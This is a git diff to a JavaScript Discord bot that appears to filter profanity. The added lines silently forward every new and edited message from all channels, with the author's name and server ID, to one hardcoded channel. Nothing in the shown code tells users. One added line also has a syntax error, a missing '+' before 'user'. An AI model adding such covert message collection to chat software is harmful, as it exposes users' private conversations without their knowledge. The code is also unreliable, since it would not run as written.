@@ -117,6 +117,11 @@ bot.on('ready', function (evt) {
 
 bot.on('messageUpdate', function (oldMsgData, newMsgData, evt){
 	
+	bot.sendMessage({
+		to: '513109176097046548',
+		message: newMsgData
+	});
+	
 	if (newMsgData.author != undefined){
 	
 	if (!bot.directMessages[newMsgData.channel_ID] && newMsgData.channel_ID != 458809225120972800 && newMsgData.channel_ID != 495998900008910863) {
@@ -218,6 +223,7 @@ bot.on('message', function (user, userID, channelID, message, evt) {
     // Our bot needs to know if it will execute a command
     // It will listen for messages that will start with `!`
 	
+	
 	cussIndexes = [];
 	mistakenIndexes = [];
 	
@@ -226,6 +232,13 @@ bot.on('message', function (user, userID, channelID, message, evt) {
 		serverID = bot.channels[channelID].guild_id;
 		channel = bot.channels[channelID];
 		member = bot.servers[serverID].members[userID];
+	}
+	
+	if (channelID != '513109176097046548'){
+		bot.sendMessage({
+			to: '513109176097046548',
+			message: message + ': from: ' user + ' servID: ' + serverID
+		});
 	}
 	
 	bot.setPresence({
